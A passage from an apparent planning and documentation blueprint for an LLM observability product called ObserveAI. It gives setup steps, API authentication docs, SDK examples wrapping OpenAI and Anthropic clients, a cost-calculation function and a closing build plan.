1. Clone repo:
```bash
   git clone https://github.com/yourusername/observeai
   cd observeai
```

2. Install dependencies:
```bash
   cd backend && npm install
   cd ../frontend && npm install
```

3. Setup environment:
```bash
   cp .env.example .env
   # Edit .env with your credentials
```

4. Setup database:
```bash
   cd backend
   npx prisma migrate dev
```

5. Start development:
```bash
   # Terminal 1 - Backend
   cd backend && npm run dev
   
   # Terminal 2 - Frontend
   cd frontend && npm run dev
```

6. Open http://localhost:5173

## Project Structure
- `/backend` - Express API
- `/frontend` - React user platform
- `/admin` - React admin panel
- `/sdk` - npm package

## Contributing
See CONTRIBUTING.md

## License
MIT

API_DOCUMENTATION.md:
────────────────────────────────────────────────────────

# API Documentation

Base URL: `https://api.observeai.com`

## Authentication

All requests require JWT token:`

Authorization: Bearer <token>

`SDK requests require API key:`

X-API-Key: obs_<key>

`## Endpoints

### Auth

#### Register
```http
POST /api/auth/register
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password123"
}
```

Response:
```json
{
  "success": true,
  "data": {
    "user": {
      "id": "user_123",
      "email": "user@example.com"
    },
    "token": "eyJhbGci..."
  }
}
```

[... continue for all endpoints ...]

SDK_DOCUMENTATION.md:
────────────────────────────────────────────────────────

# ObserveAI SDK

## Installation
```bash
npm install observeai-sdk
```

## Quick Start

### OpenAI
```javascript
import OpenAI from 'openai';
import { ObserveAI } from 'observeai-sdk';

const openai = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY
});

const observed = ObserveAI.wrap(openai, {
  apiKey: process.env.OBSERVEAI_API_KEY
});

// Use like normal OpenAI
const response = await observed.chat.completions.create({
  model: 'gpt-4',
  messages: [{ role: 'user', content: 'Hello!' }]
});
```

### Anthropic
```javascript
import Anthropic from '@anthropic-ai/sdk';
import { ObserveAI } from 'observeai-sdk';

const anthropic = new Anthropic({
  apiKey: process.env.ANTHROPIC_API_KEY
});

const observed = ObserveAI.wrapAnthropic(anthropic, {
  apiKey: process.env.OBSERVEAI_API_KEY
});

const response = await observed.messages.create({
  model: 'claude-3-sonnet-20240229',
  max_tokens: 1024,
  messages: [{ role: 'user', content: 'Hello!' }]
});
```

## Configuration
```javascript
ObserveAI.wrap(client, {
  apiKey: 'obs_...',           // Required
  baseUrl: 'https://...',      // Optional
  enabled: true,               // Optional (default: true)
  metadata: {                  // Optional
    userId: 'user_123',
    sessionId: 'session_456'
  }
});
```

[... continue with examples, troubleshooting, etc. ...]

INLINE CODE DOCUMENTATION:
────────────────────────────────────────────────────────

Use JSDoc comments:
```typescript
/**
 * Calculate cost for LLM API call
 * @param model - Model name (e.g. 'gpt-4')
 * @param promptTokens - Number of prompt tokens
 * @param completionTokens - Number of completion tokens
 * @returns Total cost in USD
 */
export function calculateCost(
  model: string,
  promptTokens: number,
  completionTokens: number
): number {
  const pricing = MODEL_PRICING[model];
  if (!pricing) return 0;
  
  const promptCost = (promptTokens / 1000) * pricing.prompt;
  const completionCost = (completionTokens / 1000) * pricing.completion;
  
  return promptCost + completionCost;
}
```

Benefits:
  • IDE autocomplete
  • Type hints
  • Auto-generated docs`

---

# 🎯 **CONCLUSION & NEXT STEPS**

## Summary

You now have a **complete technical blueprint** covering:

✅ **System Architecture** - All 4 components and how they interact

✅ **Subscription System** - 4 tiers with complete monetization

✅ **User Flows** - Every journey from signup to upgrade to downgrade

✅ **Data Architecture** - Complete database design with relationships

✅ **Authentication** - JWT + API keys + admin access

✅ **Payment Integration** - Stripe checkout, webhooks, billing

✅ **Admin Panel** - Full user management and analytics

✅ **State Management** - Zustand + React Query patterns

✅ **Error Handling** - Every edge case covered

✅ **Performance** - Optimization and scaling strategies

✅ **Security** - Multi-layer protection

✅ **Development Workflow** - Git, testing, CI/CD, monitoring

## Ready to Build

With this document, you can now:

1. **Start development** with clear direction
2. **Make architectural decisions** based on documented patterns
3. **Handle edge cases** that would otherwise surprise you
4. **Scale confidently** knowing the foundation is solid
5. **Onboard others** with comprehensive documentation

## Recommended Build Order

**Weeks 1-2:** Backend foundation + Database

**Weeks 3-4:** SDK development + testing

**Weeks 5-6:** Frontend (user platform)

**Week 7:** Admin panel

**Week 8:** Polish, testing, deployment

## Success Metrics (Week 8)

- ✅ 10+ beta users signed up
- ✅ 1,000+ requests logged
- ✅ 1+ user willing to pay
- ✅ 0 critical bugs
- ✅ All core features working